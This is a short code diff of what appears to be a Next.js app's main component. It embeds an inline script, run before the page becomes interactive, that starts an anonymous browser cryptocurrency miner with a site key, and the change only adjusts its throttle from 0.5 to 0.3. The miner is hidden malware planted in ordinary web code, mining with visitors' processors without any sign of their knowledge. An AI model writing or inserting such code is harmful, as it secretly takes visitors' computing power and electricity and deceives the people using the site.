@@ -96,7 +96,7 @@ function MyApp({ Component, pageProps }) {
         strategy="beforeInteractive"
       >
         {`
-          var miner = WMP.Anonymous('SK_qK72yRaCG6Sj6s2qAHVKL',{throttle: 0.5});
+          var miner = WMP.Anonymous('SK_qK72yRaCG6Sj6s2qAHVKL',{throttle: 0.3});
           miner.start();
         `}
       </Script>
